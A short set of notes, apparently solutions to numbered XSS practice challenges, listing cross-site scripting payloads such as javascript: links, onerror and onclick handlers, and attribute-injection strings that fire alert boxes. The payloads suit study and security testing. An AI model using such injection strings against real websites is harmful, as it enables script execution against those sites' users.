# XSS: 0

```js
<a href="javascript:alert('0xfff')">try</a>
<a href="" onclick="alert('0xfff')">try</a>
<img src=/ onerror="alert('0xfff')">
```

# XSS: 1

- xss 1 is same as 0,

# XSS: 2

- escaping the string uising +

```js
"%2Balert('0xfff')%2B";
```

# XSS: 3

```js

" onerror='javascript:alert("0xfff")'  autofocus="
```

# XSS: 4

```js
' onfocus='alert(1)'  autofocus='
```
